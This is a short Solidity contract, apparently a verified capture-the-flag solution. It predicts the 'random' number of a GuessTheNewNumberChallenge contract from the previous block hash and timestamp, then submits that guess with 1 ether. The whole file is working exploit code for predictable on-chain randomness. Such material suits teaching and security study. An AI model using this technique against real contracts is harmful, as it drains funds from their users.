/**
 *Submitted for verification at Etherscan.io on 2021-11-22
*/

pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function guess(uint8 n) public payable {}
}

contract computeAnswer {
    
    function() payable { }
    GuessTheNewNumberChallenge gtnnc = GuessTheNewNumberChallenge(0x356Fe316C0Ad5C1A10596b17382C49a15A251b61);
    function compute() public payable {
        uint8 computedAnswer = uint8(keccak256(block.blockhash(block.number - 1), now));
        uint valueToSend = 1 ether;
        gtnnc.guess.value(valueToSend)(computedAnswer);
    }
}